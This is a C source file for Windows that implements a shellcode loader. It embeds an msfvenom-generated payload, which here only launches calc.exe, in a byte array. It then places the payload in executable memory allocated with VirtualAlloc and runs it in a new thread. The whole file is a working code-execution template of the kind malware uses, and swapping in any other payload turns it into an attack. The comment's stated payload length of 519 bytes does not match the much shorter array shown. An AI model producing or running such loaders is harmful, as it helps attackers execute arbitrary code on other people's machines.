#include "Windows.h"
#include "stdio.h"

int main()
{
	/*
	msfvenom -p windows/exec CMD=calc.exe -f c
	length: 519 bytes
	*/
	unsigned char payload[] =
		"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
		"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
		"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
		"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
		"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
		"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
		"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
		"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
		"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
		"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
		"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
		"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
		"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	int payload_len = sizeof(payload);

	LPVOID  address = (LPVOID)VirtualAlloc(0, 4096, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (address == 0) {
		printf("[*] Error allocating memory. Error: %d.\n", GetLastError());
		return -1;
	}
	printf("[*] Allocated memory in process.\n");

	RtlMoveMemory(address, payload, payload_len);
	printf("[*] Wrote memory");

	DWORD thread_id;
	DWORD* pthreadId = &thread_id;

	HANDLE hRemoteThread = CreateThread(
		NULL, //lpthreadattributes
		(SIZE_T)1024, //dwstacksize
		(LPTHREAD_START_ROUTINE)address, //lpstartaddress
		NULL, //lpvoid lpparameter
		0,
		pthreadId
	);
	if (hRemoteThread == 0) {
		printf("[*] Error creating remote thread. Error: %d.\n", GetLastError());
		return -1;
	}
	printf("[*] New thread started.\n");
	printf("New thread ID is %d.\n", thread_id);

	WaitForSingleObject(hRemoteThread, INFINITE);
	return 0;
}
